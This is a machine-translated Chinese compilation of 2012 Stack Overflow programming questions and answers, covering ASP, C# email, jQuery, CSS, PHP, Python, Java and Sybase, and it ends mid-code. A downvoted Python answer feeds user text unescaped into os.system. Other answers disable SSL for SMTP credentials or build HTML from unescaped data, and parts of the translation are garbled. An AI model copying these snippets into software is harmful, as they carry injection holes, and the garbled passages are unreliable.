对于身份验证，我认为从用户体验的角度来看，最好使用 OpenID。这将为您提供某种身份验证，并且您可以区分您的用户，但仍然非常重要的是，它将允许用户使用他们当前的帐户。当网络上的每项服务都要求我为此创建一个新帐户时，我讨厌它。

希望这可以帮助。

干杯!

# asp-classic - ASP 经典中的许多“SERVER.TRANSFER”（在“案例”中）是否会损害服务器的性能？

> ID：11427110
> 
> 赞同：0
> 
> 时间：2012-07-11T06:52:29.353
> 
> 标签：asp-classic, server.transfer

我想用 ASP 经典构建这个页面：

```
<%
Dim depart

depart = 5

Select Case depart
    Case 1
        Server.Trasnfer "/check/noam/newDesign/test1.asp"
    Case 2
        Server.Trasnfer "/check/noam/newDesign/test2.asp"
    Case 3
        Server.Trasnfer "/check/noam/newDesign/test3.asp"
    Case 4
        Server.Trasnfer "/check/noam/newDesign/test4.asp"
    Case 5
        Server.Trasnfer "/check/noam/newDesign/test5.asp"
    Case 6
        Server.Trasnfer "/check/noam/newDesign/test6.asp"
    Case 7
        Server.Trasnfer "/check/noam/newDesign/test7.asp"
    Case 8
        Server.Trasnfer "/check/noam/newDesign/test8.asp"
End Select
%> 
```

而且我想知道后台服务器是否需要进入每个“Server.Transfer”，或者在正确的情况下他只会进入“Server.Transfer”？我需要知道这一点，因为我想知道使用此解决方案是否会导致服务器性能不佳（我们将来会有越来越多的案例。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T06:57:03.717

它只会输入第一个匹配的案例。在此之前，解释器将跳过不匹配的案例。

# c# - 使用专用服务器时无法发送电子邮件

> ID：11427113
> 
> 赞同：0
> 
> 时间：2012-07-11T06:52:38.990
> 
> 标签：c#, asp.net, sql-server-2008

我收到此错误，

```
Send Email Failed.Mailbox unavailable. The server response was: 5.7.1 
Unable to relay for myEmail@itaxsmart.com 
```

在此之前，我使用 godeady 进行数据库和发布站点。此代码工作之前，现在我已经转移并在我的`Database`站点上发布了我的站点，`Dedicated server` 并且我无法从服务器的 IP 错误中重播

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-13T06:08:25.103

**注意：** system.net.mail 命名空间用于发送电子邮件。

```
 protected void btnsubmit_Click(object sender, ImageClickEventArgs e)
    {
 //Code for send Email
            MailMessage sendMailforSA = new MailMessage();
            SmtpClient smtpforSA = new SmtpClient();
            string subjectforSA = null;
            subjectforSA = "Thanks for apply";
            System.Net.NetworkCredential credforSA = new System.Net.NetworkCredential("Superman@gmail.com", "password");
            sendMailforSA.To.Add(txtemailid.Value);
            MailAddress cc = new MailAddress("info@superman.com");
            sendMailforSA.CC.Add(cc);

 // sendMailforSA.CC("abcxxx@gmail.com");

     sendMailforSA.From = new MailAddress("Rajnikant@gmail.com");
            sendMailforSA.Subject = subjectforSA.ToString();
            sendMailforSA.Body =" Thank you.... your message you can use html tag for style effect";
            sendMailforSA.IsBodyHtml = true;
            smtpforSA.Host = "smtp.gmail.com";
            smtpforSA.Port = 25;
            smtpforSA.EnableSsl = false;
            smtpforSA.UseDefaultCredentials = false;
            smtpforSA.Credentials = credforSA;
            smtpforSA.Send(sendMailforSA);

} 
```

[http://satindersinght.blogspot.in/2012/01/how-to-send-email-in-asp.html](http://satindersinght.blogspot.in/2012/01/how-to-send-email-in-asp.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T08:40:28.053

复制以下代码..它适用于我的 gmail 帐户

在 web.config 中

```
<mailSettings>
  <smtp from="youremail@gmail.com">
    <network host="smtp.gmail.com" port="587" userName="youremail" password="xx" defaultCredentials="false"/>

  </smtp>
</mailSettings> 
```

在后面的代码中（点击按钮）

```
Dim smtp As New System.Net.Mail.SmtpClient()
Dim smail As New System.Net.Mail.MailMessage
smail.To.Add(New System.Net.Mail.MailAddress("emailtowhomyouwanttosend@yahoo.com "))
smail.From = New System.Net.Mail.MailAddress("youremail@gmail.com", "Visit me")
smail.Subject = "hiii"
smail.IsBodyHtml = "true"
smail.Body = "HELLO THERE"
smtp.EnableSsl = True
smtp.Send(smail) 
```

它肯定会工作..

# authentication - SSL 数据和加密 cookie 的漏洞点是什么？

> ID：11427117
> 
> 赞同：-1
> 
> 时间：2012-07-11T06:52:53.063
> 
> 标签：authentication, cookies, ssl, cryptography

我试图了解破坏 SSL 和加密 cookie 加密的决定因素。

在 SSL 使用的公钥/私钥中，密钥位是破解加密的决定因素。

同样，破解加密 cookie 加密的决定因素是什么。

谢谢，穆尔塔萨

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T10:33:07.080

> 在 SSL 使用的公钥/私钥中，密钥位是破解加密的决定因素。

这是没有意义的。SSL 仅使用公钥和私钥来签署和验证证书。实际加密使用对称一次性会话密钥。你的问题仍然完全模糊。

# jquery - 在jquery中更改onclick的值

> ID：11427129
> 
> 赞同：0
> 
> 时间：2012-07-11T06:53:56.777
> 
> 标签：jquery, onclick

这方面有很多主题，我已经尝试了解决方案，但没有任何效果。我不是 javascript 开发人员，所以可能无法弄清楚。

我的 html 中有一个 onclick 函数（php 模板文件）

```
<a href="javascript:;" onclick="AddFav({$id});" title="Add to Favs">Fav</a> 
```

单击时，正在调用 jquery ajax 函数，成功时，我想将 onclick 的值更改为 RemoveFav({$id}。我正在使用 .attr 更改标题的值。

```
$('div#fav-'+ id +' a').unbind('click').removeAttr('onclick').click(RemoveFav(id);); 
```

请帮我做同样的事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:23:27.373

如果您在评论中执行我的建议，您的代码应如下所示：

```
var removeFav = 0; // this should be set according to database query, to check if it's favved

function toggleFav()
{
    if(removeFav == 0)
    {
     //code to add fav
     removefav = 1;
    }
    else
    {
      //code to remove fav
     removefav = 0;
    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T06:59:05.977

`.click`需要回调函数。

```
$('div#fav-'+ id +' a').unbind('click').removeAttr('onclick').click(function(e) {
  e.preventDefault();
  RemoveFav(id);
}); 
```

# css - 粘滞页脚在 IE 中不起作用

> ID：11427132
> 
> 赞同：1
> 
> 时间：2012-07-11T06:54:20.380
> 
> 标签：css, internet-explorer, css-position, computability

我为我的网站创建了一个 Sticky 页脚，您可以在此小提琴中查看：http: [//jsfiddle.net/Aw6vn/](http://jsfiddle.net/Aw6vn/)

```
#main_Ticker{
    position: fixed;
    bottom: 0; 
    right: 12%;
    z-index: 6000 !important;
} 
```

它适用于 jsfiddle 中的所有浏览器，但是当我将代码放在我的页面中时，它在 IE8-9 中不起作用：

[http://s-maof.com/PRO/index2.php?fkapp=2](http://s-maof.com/PRO/index2.php?fkapp=2)

我也试过：

```
position: absolute; bottom: 0; right: 12%; 
```

没有做到这一点。

感谢“我的头疼”，解决方案是编辑掉评论的标题

```
<!--<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">-->
<!--<!DOCTYPE HTML>-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
```

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:18:21.370

删除之前的评论，`!Doctype`因为这些强制 IE 进入怪癖模式[（见这里）](https://stackoverflow.com/a/7312841/681807)

```
<!--<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">-->
<!--<!DOCTYPE HTML>-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:04:28.730

在您的风格中添加以下内容并尝试：

```
<style>
    *html, body {
        height: 100%;
    }
</style> 
```

# titlebar - 服务标记 (℠) 在 not displaying in IE8

My client has requirement that Service Mark(SM) like TM should be displayed on the title bar of the browser. I have got these html code for SM: And then i tried like this:&l

> ID：11427135
> 
> 赞同：3
> 
> 时间：2012-07-11T06:54:52.313
> 
> 标签：titlebar

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:03:59.710

这也是android浏览器中的一个问题。

只需包装一个跨度：

```
<span class"service-mark">sm</span> 
```

并添加一些 CSS 来伪造上标效果：

```
span.service-mark{
   vertical-align: super; 
   font-size: smaller; 
   line-height: 0;
} 
```

参考：[https ://code.google.com/p/android/issues/detail?id=18919](https://code.google.com/p/android/issues/detail?id=18919)

# php - 使用后退按钮后 PHP“文档已过期”

> ID：11427136
> 
> 赞同：0
> 
> 时间：2012-07-11T06:54:53.237
> 
> 标签：php, post, smarty

我有一个表格，我在向导中提交了一些信息。此页面通过 POST 到达并使用 Smarty 显示。一旦我提交了所有信息，我将使用另一个帖子进入另一个页面。现在，问题是当我尝试使用 BACK 按钮返回时，我收到“文档已过期”消息。

当我使用 POST 时，这不是正常的事情吗？

我现在正在尝试使用 GET 但没有任何变化，或者我的 GET 写错了。

这是一个小架构：

```
Page 1 -> POST -> Page 2 (wizard) -> POST -> Page 3 
```

当我尝试从第 3 页返回到第 2 页时，文档已过期。

非常感谢您对我的问题的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-11T07:10:06.873

[http://en.wikipedia.org/wiki/Post/Redirect/Get](http://en.wikipedia.org/wiki/Post/Redirect/Get)

在我看来，您应该为*每个*POST 执行此操作，至少在生产中是这样。

小例子：

```
if ('GET' == $_SERVER['REQUEST_METHOD']) {
   //display view
}
else if ('POST' == $_SERVER['REQUEST_METHOD']) {
   //process input
   //update session
   header('Location: /next/page/to/view', true, 303);
} 
```

编辑：想指出这篇旧帖子指的是浏览器提交。在 RESTful Web 服务中，您可能会以 201 作为 POST 响应。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:03:03.860

一切都是正确的。当您推送`BACK`您的内容时，`Page 3`您实际上是在尝试转到上一页 - 此页面是作为对 bowser 的 POST 请求的回复而生成的。要查看此页面，应发送新的 POST 请求，并根据 POST 数据生成页面。

# python - 字符串中的 Python 通配符搜索

> ID：11427138
> 
> 赞同：88
> 
> 时间：2012-07-11T06:54:58.917
> 
> 标签：python

假设我有一个清单

```
list = ['this','is','just','a','test'] 
```

如何让用户进行通配符搜索？

搜索词：'th_s'

会返回“这个”

* * *

## 回答 #1

> 赞同：178
> 
> 时间：2012-07-11T06:57:55.047

使用[`fnmatch`](http://docs.python.org/library/fnmatch.html)：

```
import fnmatch
lst = ['this','is','just','a','test']
filtered = fnmatch.filter(lst, 'th?s') 
```

如果您想允许`_`作为通配符，只需[将](http://docs.python.org/library/stdtypes.html#str.replace)所有下划线替换为`'?'`（对于一个字符）或`*`（对于多个字符）。

如果您希望您的用户使用更强大的过滤选项，请考虑允许他们使用[正则表达式](http://docs.python.org/library/re.html)。

* * *

## 回答 #2

> 赞同：58
> 
> 时间：2012-07-11T07:00:59.837

正则表达式可能是解决此问题的最简单方法：

```
import re
regex = re.compile('th.s')
l = ['this', 'is', 'just', 'a', 'test']
matches = [string for string in l if re.match(regex, string)] 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-07-11T07:04:42.460

你可以试试[fnmatch](https://docs.python.org/3/library/fnmatch.html)模块，它有一个类似于 shell 的通配符语法

或者可以使用[正则表达式](http://www.tutorialspoint.com/python/python_reg_expressions.htm)

重新进口

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-11T06:57:36.150

您的意思是通配符的任何特定语法吗？通常`*`代表“一个或多个”字符，`?`代表一个。

最简单的方法可能是将通配符表达式转换为正则表达式，然后使用它来过滤结果。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-10-17T17:41:56.473

为什么不直接使用 join 功能？在正则表达式 findall() 或 group() 中，您将需要一个字符串，因此：

```
import re
regex = re.compile('th.s')
l = ['this', 'is', 'just', 'a', 'test']
matches = re.findall(regex, ' '.join(l)) #Syntax option 1
matches = regex.findall(' '.join(l)) #Syntax option 2 
```

join() 函数允许您将列表转换为字符串。加入前的单引号是您将放在列表中每个字符串中间的内容。当您执行此代码部分 (' '.join(l)) 时，您将收到以下信息：

'这只是一个测试'

所以你可以使用 findal() 函数。

我知道我迟到了 7 年，但我最近创建了一个帐户，因为我正在学习，其他人可能有同样的问题。我希望这对您和其他人有所帮助。

* * *

@FélixBrunet 评论后更新：

```
import re
regex = re.compile(r'th.s')
l = ['this', 'is', 'just', 'a', 'test','th','s', 'this is']

matches2=[] #declare a list
for i in range(len(l)): #loop with the iterations = list l lenght. This avoid the first item commented by @Felix
if regex.findall(l[i]) != []: #if the position i is not an empty list do the next line. PS: remember regex.findall() command return a list.
    if l[i]== ''.join(regex.findall(l[i])): # If the string of i position of l list = command findall() i position so it'll allow the program do the next line - this avoid the second item commented by @Félix
        matches2.append(''.join(regex.findall(l[i]))) #adds in the list just the string in the matches2 list

print(matches2) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-07-20T13:47:35.667

与 Yuushi 使用正则表达式的想法相同，但它使用 re 库中的 findall 方法而不是列表推导：

```
import re
regex = re.compile('th.s')
l = ['this', 'is', 'just', 'a', 'test']
matches = re.findall(regex, string) 
```

* * *

## 回答 #7

> 赞同：-8
> 
> 时间：2017-09-07T05:33:11.500

简单的方法是尝试`os.system`：

```
import os
text = 'this is text'
os.system("echo %s | grep 't*'" % text) 
```

# python - 如何使用 odbc 查询 Sybase IQ 服务器？

> ID：11427139
> 
> 赞同：2
> 
> 时间：2012-07-11T06:55:06.417
> 
> 标签：python, database, sap-iq

如何使用 ODBC 从 Python 或 Perl 等脚本查询 Sybase IQ 服务器？我在互联网上搜索，但找不到示例连接字符串。有人可以为此提供示例连接字符串吗？

我的连接细节是服务器名称和数据库模式名称。（以及用户名和密码）。

使用 isql 的示例是

```
isql -S SERVER_IQ -D schema_name -U username -P password 
```

当我指定正确的详细信息时，上述连接有效。我需要使用 odbc 驱动程序或 Sybase IQ 驱动程序的相应连接字符串。

谢谢。

问候， 阿洛克

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-09T01:57:22.633

Perl 提供了一个易于使用的界面，这与 R 上的 Python 不同。无论如何，我从我们的 DBA 那里找到了解决方案。我使用以下连接字符串打开 Sybase IQ 连接

```
"Driver={Sybase IQ};UID=username; PWD=*******; ServerName=SERVERNAME; CommLinks=SharedMemory,TCPIP{host=server.sg.planet.com;port=111}" 
```

问候， 阿洛克

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T04:36:26.050

This may not be an answer, but I think it could qualify.

Why not use the native implementation for Perl? [http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.help.sqlanywhere.11.0.1/dbprogramming_en11/pg-perl.html](http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.help.sqlanywhere.11.0.1/dbprogramming_en11/pg-perl.html)

# lua - Lua 脚本与多个 redis 实例交互（存储/读取）

> ID：11427144
> 
> 赞同：1
> 
> 时间：2012-07-11T06:55:18.337
> 
> 标签：lua, redis

我有一个8核系统。我在上面运行了 7 个 Redis 实例（这样几乎所有的核心都被利用了）。我知道我可以使用 Lua 脚本与 Redis 实例交互（在服务器上进行客户端处理）。但它只是一个与一个 Redis 实例交互的 Lua 脚本。

我可以制作一个 Lua 脚本来与节点上的所有 redis 实例交互（存储/读取）吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-07-08T19:10:23.407

在 Redis 中这是不可能的。但是您可以在 Tarantool 中执行此操作，幸运的是，它具有用于服务器端脚本的相同 lua 语言，因此您在迁移现有代码时应该不会遇到问题。Tarantool 与 redis 非常相似，但有一些独特的功能，例如它支持从 lua 脚本到其他实例（包括本地实例）的 rpc 调用。我还没有找到另一个具有类似功能的 NoSQL 内存解决方案。

# java - jcombobox（显示名称和返回代码）

> ID：11427147
> 
> 赞同：-2
> 
> 时间：2012-07-11T06:55:35.920
> 
> 标签：java, swing

我的数据库中有一个表，我现在有一些名称和相应的代码，现在我想要在 jcombobox 中显示名称，但是当我从该 jcombobox 中选择任何名称时，应该返回相应的代码。

桌子就像

名称代码
a 1
b 2
c 3

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:54:39.983

为什么不使用列表单元渲染器将代码和名称包装在对象中，只渲染ame，但是您可以从 .getSelectedItem 获取返回的对象并从中提取代码

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:34:19.580

您需要将代码存储在例如一个`ArrayList`并使用组合框的选择索引检索当前代码。

```
private JComboBox comboBox;
private List<Integer> codes;

private void createUI() {
    comboBox = new JComboBox();
    codes = new ArrayList<Integer>();
    addItem("one", 42);
    addItem("two", 127);
    comboBox.addActionListener(new ActionListener() {
        @Override
        public void actionPerformed(ActionEvent e) {
            System.out.println(comboBox.getSelectedIndex());
            System.out.println(codes.get(comboBox.getSelectedIndex()));
        }
    });
    add(comboBox);
}

private void addItem(String name, int code) {
    comboBox.addItem(name);
    codes.add(code);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T08:26:41.387

您可以创建一个包装类 - 我们称之为`TableElement`：

```
class TableElement {
  public String name;
  public double value;

  public TableElement(String n, double v) {
    name = n;
    value = v;
  }

  // this is what is shown in the JComboBox
  public String toString() {
    return name;
  }
} 
```

然后你可以创建一个包含所有表格元素的数组并`JComboBox`像这样创建

```
Vector<TableElement> vect = new Vector<TableElement>();
for (/* all your table elements */) 
  vect.add(new TableElement(elementName, elementValue);
JComboBox comboBox = new JComboBox(vect); 
```

并像这样读出来：

```
TableElement selected = (TableElement)comboBox.getSelectedItem();
System.out.println("name = " +selected.name + ",value = " + selected.value); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:01:56.773

看看

1.  [ItemListener](http://docs.oracle.com/javase/tutorial/uiswing/events/itemlistener.html)（触发事件总是两次）

2.  [动作监听器](http://docs.oracle.com/javase/tutorial/uiswing/events/actionlistener.html)

# c# - 在 c# 中解析部分类似于 html 的表格的文本

> ID：11427149
> 
> 赞同：0
> 
> 时间：2012-07-11T06:55:40.410
> 
> 标签：c#, parsing, text

我有一个自由文本，其中可能包含类似 html 的表格定义，例如：

这是自由文本.....更多自由文本... *表格开始* *行开始*

# 单元格 1 内容# #单元格 2 内容

# 单元格 3 内容

*row end* *table end* 可能包含更多表格定义的更多自由文本。

我正在寻找从 C# 中的此类文本中解析表格的最佳方法。我读过正则表达式不适用于此类文本。任何人都可以帮助解决这个问题吗？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:04:07.040

你可以这样尝试：

```
 string input = @"free text ... 
        <table><tr><td>
            <table><tr><td>test</td></tr></table>
        </td></tr></table> 
        more free text";
        string inputWithRoot = String.Format("<root>{0}</root>", input);

        XElement el = XElement.Parse(inputWithRoot);
        var tables = el.Descendants("table");

        foreach (XElement table in tables)
        {
            Console.WriteLine(table.ToString());
            Console.WriteLine();
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:00:53.563

将表格提取到字符串后

请使用 Server.HtmlEncode 对包含 html 的文本进行编码

# java - 在另一个方法的参数列表中调用方法在 Java 中是一个好习惯吗？

> ID：11427150
> 
> 赞同：2
> 
> 时间：2012-07-11T06:55:40.517
> 
> 标签：java

从另一个方法的参数列表中调用一个方法是一种*好习惯吗？*

```
public String processRequestBasedOnCondition(MyObject obj) {
   return executeRequest(frameRequestObject(obj));
}

public String executeRequest(RequestObject rqObject){
   return rqObject.execute();
} 
```

1.  我可以将 的返回值保存`frameRequestObject(obj)`在一个变量中，并将其作为参数传递给`executeRequest()?`在这种情况下哪个是最佳实践？
2.  返回“return `rqObject.execute();`”之类的值是一种好习惯吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:03:35.187

1.  是的你可以

    ```
    public String processRequestBasedOnCondition(MyObject obj) {
        RequestObject requestObject = frameRequestObject(obj);
        return executeRequest(requestObject);
    } 
    ```

2.  偏好多于实践。

有些人可能会争辩说，将调用分配给变量更具可读性。就我个人而言，我会简单地`return rqObject.execute()`认为它具有足够的可读性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:24:06.963

坦率地说，**两者**都是关于**偏好而不是实践。**

**1.**

```
RequestObject reqObj = frameRequestObject(obj);
   return executeRequest(reqObj); 
```

**2.** 对于像这样返回 rqObject.execute() 的新手来说，可能会令人困惑。**然而，它是一种更清洁的方式......我更喜欢这个。**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:01:16.883

`Can I hold the return value of frameRequestObject(obj) in a variable and pass it as argument to the executeRequest()? Which is the best practice in this case?`

**是**的，你可以。但是为了更好的可读性，首先捕获方法的输出，然后将其传递给其他方法。

`is it a good practice to return the value like "return rqObject.execute()`

在这里，代码的更好的可读性也很重要，但是你可以做到。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:01:43.453

我认为在这种情况下你应该没问题。

编写可读代码很重要。在这种情况下，使用诸如`return executeRequest(frameRequestObject(obj));`仍然非常可读的东西。

当你有这样的事情时，事情开始变得混乱： `return executeRequest(foo.getBar().getValue().frameRequestObject(obj));`

应避免使用上述代码。这就是为什么大多数时候建议总是把事情分解。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-11T07:04:01.923

它实际上是**功能**风格（*很好*）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-11T07:05:22.597

1.  只要代码保持可读性，就没有问题。如果在一行 200 个字符的代码中最终调用了 10 个方法，那就不能再接受了
2.  是的。将调用结果存储在局部变量中并返回局部变量并没有任何实际用途。它可以帮助调试，但直接返回结果是可以的。如果调试需要额外的变量，此时您仍然可以添加它。

# javascript - jQuery同位素无效渲染

> ID：11427152
> 
> 赞同：0
> 
> 时间：2012-07-11T06:55:45.637
> 
> 标签：javascript, jquery, css, jquery-plugins, jquery-isotope

为什么这两个小提琴不同？我的意思是他们不应该在第一把小提琴中也像在第二把小提琴中那样粘在一起吗？

小提琴1：http : [//jsfiddle.net/gopi1410/EABJw/](http://jsfiddle.net/gopi1410/EABJw/)

小提琴2：http : [//jsfiddle.net/gopi1410/EABJw/1/](http://jsfiddle.net/gopi1410/EABJw/1/)

小提琴的唯一区别是第一个有 css:`#id2 {width: 240px;}`而第二个小提琴有`#id2 {width: 140px;}`

**它是同位素插件中的错误还是我错过了一些基本点？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:34:57.710

只需像这样更改您的javascript：

```
$(function() {
    var $container = $('#container');
    $container.isotope({
        masonry: {columnWidth: 1},
        itemSelector: '.item'          
    });
}); 
```

# javascript - 如何按指定的对象值对 json 数组进行分组？

> ID：11427153
> 
> 赞同：0
> 
> 时间：2012-07-11T06:55:52.143
> 
> 标签：javascript, arrays, json

我在[这里](http://www.greenfields.co.id:502/Service1.svc/id)有 json 。
这是表中的结果： ![在此处输入图像描述](../Images/e49e94a9a2b80a2d2df831e4536c857e.png)
这是我获取 json 并将其解析为表的 javascript：

```
function detail(kodenegara, koderesult)
        {
            $.ajax({
                type: "GET",
                contentType: "application/json; charset=utf-8",
                url: "http://www.greenfields.co.id:502/Service1.svc/"+kodenegara,
                dataType: "json",
                success:function(data){
                    var result = koderesult;

                    var details = "";

                    for (i = 0; i < data[result].length; i++){
                        details += 
                          "<tr>"+
                            "<td>"+data[result][i].mc+"</td>"+
                            "<td>"+data[result][i].value3+"</td>"+
                            "<td>"+data[result][i].value2+"</td>"+
                            "<td>"+data[result][i].value1+"</td>"+
                            "<td>"+data[result][i].avgqty+"</td>"+
                            "<td>"+data[result][i].budqty+"</td>"+
                            "<td>"+data[result][i].budval+"</td>"+
                            "<td>"+data[result][i].acvqty+"</td>"+
                            "<td>"+data[result][i].acvval+"</td>"+
                          "</tr>";
                    }
                    $("#table_" + kodenegara)
                    .empty()
                    .append(details)
                    .trigger('create');
                    //show the page
                    $.mobile.changePage("#detail_"+kodenegara, "slide", false, true);
                },
                error: function () { 
                    alert("ERROR"); 
                }
            });
        } 
```

我想按对象名称对 json 数组进行分组`tipe`。所以表格将按 和 分组，`tipe`如下所示：
![在此处输入图像描述](../Images/3e39cc781f77afcb8dc534772557ae84.png)

问题是我应该如何处理我在 javascript 中的循环？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:28:39.873

创建 5 个具有 5 个 id 的表，每个表都等于您的小费之一。

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script src="jquery.js"></script>

    <script type="text/javascript">
function detail(kodenegara, koderesult)
        {
            $.ajax({
                type: "GET",
                contentType: "application/json; charset=utf-8",
                url: "http://www.greenfields.co.id:502/Service1.svc/"+kodenegara,
                dataType: "json",
                success:function(data){
                    var result = koderesult;

                    var details = "";

                    for (i = 0; i < data[result].length; i++){
                        $("#"+data[result][i].tipe).append("<tr>"+
                            "<td>"+data[result][i].mc+"</td>"+
                            "<td>"+data[result][i].value3+"</td>"+
                            "<td>"+data[result][i].value2+"</td>"+
                            "<td>"+data[result][i].value1+"</td>"+
                            "<td>"+data[result][i].avgqty+"</td>"+
                            "<td>"+data[result][i].budqty+"</td>"+
                            "<td>"+data[result][i].budval+"</td>"+
                            "<td>"+data[result][i].acvqty+"</td>"+
                            "<td>"+data[result][i].acvval+"</td>"+
                          "</tr>");
                    }
                    $("#table_" + kodenegara)
                    .empty()
                    .append(details)
                    .trigger('create');
                    //show the page
                    $.mobile.changePage("#detail_"+kodenegara, "slide", false, true);
                },
                error: function () { 
                    alert("ERROR"); 
                }
            });
        }

</script>

<style></style><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Untitled Document</title>
</head>

<body>
<table id="ESL" border="1"></table>
<table id="ESL500ML" border="1"></table>
<table id="UHT" border="1"></table>
<table id="WHP" border="1"></table>
<table id="CHEESEIK" border="1"></table>
</body>
</html> 
```

# eclipse - gdb 填充 Eclipse 的变量窗口非常缓慢

> ID：11427157
> 
> 赞同：0
> 
> 时间：2012-07-11T06:56:03.297
> 
> 标签：eclipse, gdb, eclipse-cdt

我刚刚开始从事一个大型 C++ 项目。当我通过 GDB 在 Eclipse CDT 中调试我的 C++ 代码时，填充变量窗口需要很长时间 - 可能是因为它显示了*范围内*的所有变量，对于这个特定的应用程序来说，这些变量包括大量的全局变量。

这样做的结果是，当变量窗口打开时，涉及刷新此视图的所有操作（例如移动到下一行）大约需要一整分钟。当它关闭时，它具有健全的性能。

因此，同时我不使用它并通过悬停视图和表达式视图来解决问题，但是拥有某种可变窗口会很方便。有没有办法

1.  修复该窗口的性能，或
2.  以某种方式限制那里显示的变量（例如，仅在即时范围内），以便在合理的时间内更新？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:25:59.933

奇怪的是，减少 GUI 必须经过的跳数 - 例如通过 ssh**或**VNC 运行 Eclipse，而不是同时通过两者 - 显着提高了性能。我猜这与 Eclipse 中的一些 GUI 更新机制有关。

# php - 请求和路由器不加载动作

> ID：11427159
> 
> 赞同：0
> 
> 时间：2012-07-11T06:56:22.737
> 
> 标签：php, oop, class, request, router

我有请求和路由器类 - 它可以工作，但是当我尝试运行操作时它没有任何结果

例如。本地主机/测试仪/测试

指数

```
$router = OOP_Controller_Router::getInstance();
$request = new OOP_Controller_Request();
$router->dispatch($request); 
```

要求

```
class OOP_Controller_Request {

    private $_requestParams = array ();
    public $_defaultController;

    public function __construct(){

        $filter_ALL = new OOP_InputFilter();

        $address1   = parse_url( $_SERVER['REQUEST_URI'] );
        $path   = explode('/', trim($address1['path'],'/') );

        $parameters1['controller'] = $filter_ALL->process( str_replace('-','',strtolower($path[0])) );
        $parameters1['action'] = $filter_ALL->process( str_replace('-','',strtolower($path[1])) );

        array_shift($path);
        array_shift($path);
        $path = array_chunk($path, 2);
        for( $i=0;$i<count($path);$i++ ){
            if( !isset($path[$i][1]) ) { $path[$i][1] = 1; }
            $parameters1[ $path[$i][0] ] = $path[$i][1];
        }

        $this->_requestParams = array_merge($_REQUEST,$parameters1);

        $_REQUEST   = array();
        $_POST      = array();
        $_GET       = array();
    }

    public function getParam($paramName){
        if(isset($this->_requestParams[$paramName])){
            return $this->_requestParams[$paramName];
        } else {
            return false;
        }
    }

    public function setParam($paramName,$paramValue){
        $this->_requestParams[$paramName] = $paramValue;
    }
} 
```

路由器 *$controllerClass = new $controllerClassName($request->getParam('action'));* - 这个加载类但不加载动作

```
class OOP_Controller_Router implements OOP_Controller_Interface{

    private $controllerFileNamePrefix;
    private $controllerFileNameSufix;
    private static $instance;

    private function __construct(){
        define('APP_PATH',$_SERVER['DOCUMENT_ROOT'].'/');

        $this->_controllerFileNamePrefix = APP_PATH.'controllers/';
        $this->_controllerFileNameSufix = '.php';
    }

    private function __clone(){
        trigger_error('Clone done', E_USER_ERROR);
    }

    public function __wakeup(){
        trigger_error('Deserialaze cannot done', E_USER_ERROR);
    }

    public static function getInstance(){
        if (!self::$instance instanceof self){
            self::$instance = new self;
        }
        return self::$instance;
    }

    public function dispatch(OOP_Controller_Request $request){

        $controllerClassName = 'controllers_'.$request->getParam('controller');

        //if controller != ''
        if ($request->getParam('controller')!=''){
        //if file exists load this
            if( file_exists($this->_controllerFileNamePrefix . $request->getParam('controller') . $this->_controllerFileNameSufix) ){

*$controllerClass = new $controllerClassName($request->getParam('action'));*
        //if file !exists load default controller
            } else {
                $controllerClass = $request->_defaultController;
            }
    //if controller = '' load default controller
        } else {
            $this->dispatch_default_controller($request,2);
        }
    }

    public function dispatch_default_controller(OOP_Controller_Request $request, $action_dispatch){
        global $myconf;
        $default_controller = 'controllers_'.$myconf['default_controller'];
